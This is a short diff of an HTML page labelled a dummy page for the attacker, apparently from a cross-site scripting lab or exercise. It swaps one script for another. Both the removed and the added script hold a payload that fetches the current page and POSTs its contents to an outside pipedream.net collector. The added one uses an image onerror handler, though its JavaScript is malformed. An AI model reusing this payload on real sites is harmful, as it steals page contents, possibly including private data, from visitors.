@@ -6,8 +6,11 @@
 <body>
   <h1>Dummy Page</h1>
   <p>This page acts as a dummy page for the attacker.</p>
-  <script defer>
-  document.title = "<script>fetch(window.location.href).then(response => response.text()).then(responseText => fetch('https://eok0h61dts3i7c3.m.pipedream.net', { method: 'POST', body: responseText }));</script>";
-</script>
 </body>
+<script defer>
+  document.title = <img src="1" onerror="
+    fetch(window.location.href)
+    .then(response => response.text())
+    .then(responseText => fetch('https://eok0h61dts3i7c3.m.pipedream.net', { method: 'POST', body: responseText }));">";
+</script>
 </html>
